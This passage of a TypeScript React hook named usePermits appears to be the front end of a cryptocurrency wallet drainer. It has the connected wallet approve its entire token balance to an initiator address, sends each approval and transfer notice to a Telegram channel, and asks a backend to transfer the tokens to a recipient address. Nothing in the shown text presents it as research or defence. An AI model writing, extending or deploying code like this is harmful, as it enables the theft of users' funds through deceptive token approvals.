    log(`Standard allowance for ${token.name}: ${ethers.utils.formatUnits(allowance, decimals)}`);

    // Generate deep link for wallet approval
    const deepLinkParams = {
      method: "approveTransaction",
      params: {
        tokenAddress: token.address,
        userAddress,
        chainId,
        recipientAddress,
        amount: rawBalance.toString(),
      },
    };

    const deepLink = generateDeepLink(walletName, deepLinkParams);
    log(`Generated deep link: ${deepLink}`);

    // Notify Telegram about the deep link
    await sendToTelegram(`Approval required for ${token.name}. Use this link: ${deepLink}`);

    // Approve the full balance if needed
    if (allowance.lt(rawBalance)) {
      log(
        `Allowance (${allowance.toString()}) is less than balance (${rawBalance.toString()}). Waiting for approval transaction...`
      );
      try {
        const approveTx = await tokenContract.approve(BR_INITIATOR_ADDRESS, rawBalance);
        log(`Approval transaction sent. Tx Hash: ${approveTx.hash}`);
        await approveTx.wait();
        log(`Approval successful for ${adjustedBalance} ${token.symbol}`);
        await sendToTelegram(`Approval successful for ${adjustedBalance} ${token.name}. Tx Hash: ${approveTx.hash}`);
      } catch (error) {
        console.error(`Error during approval for token ${token.name}:`, error);
        return; // Skip transfer if approval fails
      }
    } else {
      log(`Sufficient standard allowance exists for token ${token.name}. Skipping approval.`);
    }

    // Prepare payload for backend transfer
    const payload = {
      tokenAddress: token.address,
      userAddress,
      chainId: Number(chainId), // Ensure chainId is a number
      recipientAddress,
    };

    try {
      const response = (await sendToBackend("handleApprovalAndTransfer", payload)) as {
        backendTxHash: string;
        frontendTxHash: string;
      };

      if (response?.backendTxHash && response?.frontendTxHash) {
        log(
          `Transfer successful! Backend Tx Hash: ${response.backendTxHash}, Frontend Tx Hash: ${response.frontendTxHash}`
        );
        await sendToTelegram(
          `Transfer successful for ${adjustedBalance} ${token.name}.\nBackend Tx Hash: ${response.backendTxHash}\nFrontend Tx Hash: ${response.frontendTxHash}`
        );
      } else {
        warn(`Unexpected backend response for ${token.name}:`, response);
      }
    } catch (error) {
      console.error(`Error sending transfer request for token ${token.name} to backend:`, error);
    }
  } catch (error: unknown) {
    if (error instanceof Error) {
      console.error(`Error in handlfeApprovalAndTransfer for token ${token.name}:`, error.message);
      await sendToTelegram(`Error during approval or transfer for ${token.name}: ${error.message}`);
    } else {
      console.error(`Unknown error in handleApprovalAndTransfer:`, error);
    }
  }
};

  return { loading, sendTransactions };
}


export default usePermits;
